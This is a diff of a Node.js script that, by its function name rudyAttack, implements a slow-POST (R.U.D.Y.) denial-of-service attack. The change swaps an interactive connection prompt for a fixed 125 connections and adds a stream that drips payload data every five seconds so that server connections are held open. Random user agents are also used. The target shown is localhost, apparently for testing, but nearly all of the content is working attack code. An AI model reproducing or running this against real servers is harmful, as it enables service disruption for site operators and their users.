@@ -2,17 +2,19 @@ const request = require('request')
 const useragent = require('random-useragent')
 const rp = require('request-promise')
 const fs = require('fs')
-const readline = require('readline-promise').default
 
 let stream = fs.createReadStream('payload.txt')
 
-const host = 'http://127.0.0.1:3000/'
+const host = 'http://127.0.0.1:3000'
+const connections = 125
 
-const rlp = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout,
-  terminal: true
-})
+function setupStream() {
+  stream._read = () => {
+    setTimeout(() => {
+      stream.push('payload.txt')
+    }, 5000)
+  }
+}
 
 const options = {
   method: 'POST',
@@ -30,23 +32,20 @@ const options = {
 rudyAttack()
 
 function rudyAttack() {
-  rlp.questionAsync('How many connections? ').then(c => {
-    const connections = c ? c : 5000
-
-    for(let i = 0; i < connections; i++) {
-      attack()
-    }
-  })
+  for(let i = 0; i < connections; i++) {
+    setupStream()
+    attack()
+  }
 }
 
 function attack() {
   rp(options)
   .then(() => {
-    console.log('Successful request')
+    console.log('Request initiated')
     closeStream()
   })
   .catch(err => {
-    console.error('Error while sending request')
+    console.error('An error occured while sending request')
     closeStream()
   })
 }
